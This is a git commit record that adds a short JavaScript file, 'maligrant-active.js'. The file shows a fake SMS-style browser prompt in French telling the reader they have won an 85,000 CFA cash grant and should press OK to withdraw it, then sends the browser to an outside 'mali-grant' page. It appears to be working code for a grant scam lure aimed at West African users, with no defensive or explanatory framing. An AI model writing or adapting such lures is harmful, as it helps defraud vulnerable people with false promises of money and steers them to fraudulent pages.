1afc6bfe94942dbc8da1f30aa88b7ac21c917a9e
itidnewblog3 <ukpehaitid1@gmail.com>
2025-09-21 08:24:35 +0100

    Create maligrant-active.js

---
+++ maligrant-active.js
@@ -0,0 +1,5 @@
+var password = 'RETIRER 85 000 CFA'
+password=prompt('SMS: Félicitations, vous êtes parmi les sélectionnés pour recevoir une subvention en espèces de 85 000 CFA. Appuyez sur OK pour retirer ','RETIRER 85 000 CFA');
+if (password != 'RETIRER 85 000 CFA') {
+location.href='http://lhegit.org/mali-grant.html';
+}
